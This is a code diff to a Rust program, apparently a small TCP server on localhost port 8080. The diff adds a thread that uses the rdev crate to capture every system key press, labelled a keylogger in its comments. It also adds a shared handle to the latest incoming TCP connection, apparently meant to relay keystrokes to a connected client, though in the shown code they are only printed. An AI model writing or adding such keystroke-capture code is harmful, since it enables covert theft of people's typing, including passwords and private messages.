@@ -1,6 +1,9 @@
+use rdev::{listen, EventType};
 use std::env;
 use std::fs::File;
 use std::path::Path;
+use std::sync::{Arc, Mutex};
+use std::thread;
 use std::{
     io::{self, Read, Write},
     net::{TcpListener, TcpStream},
@@ -10,15 +13,41 @@ use std::{
 fn main() -> std::io::Result<()> {
     let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
 
+    // Arc and Mutex to share the stream between the main thread and the keylogger
+    let stream_mutex = Arc::new(Mutex::new(None::<TcpStream>));
+
+    // Clone the Arc for the keylogger thread
+    let keylogger_stream = Arc::clone(&stream_mutex);
+
+    // Start keylogger in a separate thread
+    thread::spawn(move || {
+        if let Err(error) = listen(move |event| {
+            if let EventType::KeyPress(key) = event.event_type {
+                let key_str = format!("{:?}", key);
+                println!("Key pressed: {}", key_str);
+            }
+        }) {
+            eprintln!("Error: {:?}", error);
+        }
+    });
+
+    // Main server loop
     for stream in listener.incoming() {
         match stream {
             Ok(stream) => {
+                let stream_clone = Arc::clone(&stream_mutex);
+                {
+                    // Lock the stream and update it with the new incoming connection
+                    let mut locked_stream = stream_clone.lock().unwrap();
+                    *locked_stream = Some(stream.try_clone().unwrap());
+                }
+
                 if let Err(e) = process_stream(stream) {
-                    eprintln!("Failed to process {}", e)
+                    eprintln!("Failed to process {}", e);
                 }
             }
             Err(e) => {
-                eprintln!("Failed to process {}", e)
+                eprintln!("Failed to process {}", e);
             }
         }
     }
